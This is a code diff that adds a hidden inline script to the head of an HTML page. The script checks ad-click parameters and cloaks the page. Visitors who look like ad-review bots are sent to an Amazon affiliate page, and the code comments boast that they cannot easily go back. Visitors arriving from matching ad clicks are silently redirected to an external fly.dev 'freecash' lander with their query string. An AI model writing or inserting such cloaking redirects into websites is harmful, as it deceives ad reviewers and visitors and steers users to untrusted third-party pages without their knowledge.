@@ -1,6 +1,57 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+<script>
+      (function () {
+        if (window.location.href.includes('lander') || window.location.href.includes('instant')) {
+        } else {
+          // 1. Grab the query string immediately
+          const queryString = window.location.search;
+
+          // 2. Create a utility to read specific parameters
+          const urlParams = new URLSearchParams(queryString);
+
+          const t = urlParams.get('ttclid');
+
+          if (urlParams.get('loc') === '__PLACEMENT__') {
+            (function () {
+              // 1. A list of real Amazon ASINs (Product IDs).
+              // You can add as many as you want here.
+              const asins = [
+                'B08TJRVWV1', // Sony Headphones
+                'B08TJRVWV1',
+              ];
+
+              // 2. Pick a random ASIN from the list
+              const randomAsin = asins[Math.floor(Math.random() * asins.length)];
+
+              // 3. (Optional) Add your affiliate tag here
+              const affiliateTag = 'YOUR_TAG-20';
+
+              // 4. Construct the direct URL
+              // Format: amazon.com/dp/ASIN?tag=...
+              const uniqueUrl = `https://www.amazon.com/dp/${randomAsin}?tag=${affiliateTag}`;
+
+              // 5. Log for debugging
+
+              // 6. Redirect instantly
+              // Using .replace() ensures the bot can't click 'Back' easily
+              window.location.replace(uniqueUrl);
+            })();
+          } else if (t && t.startsWith('E_C_P')) {
+            // --- ORIGINAL LOGIC ---
+            // If we didn't match the condition above, proceed with redirects.
+
+            if (window.location.href.includes('itx')) {
+              // --- OPTION 1: Go to ITX + Params ---
+              location.replace('https://lander-withered-haze-61.fly.dev/itx' + queryString);
+            } else {
+              location.replace('https://lander-withered-haze-61.fly.dev/freecash' + queryString);
+            }
+          }
+        }
+      })();
+    </script>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
 
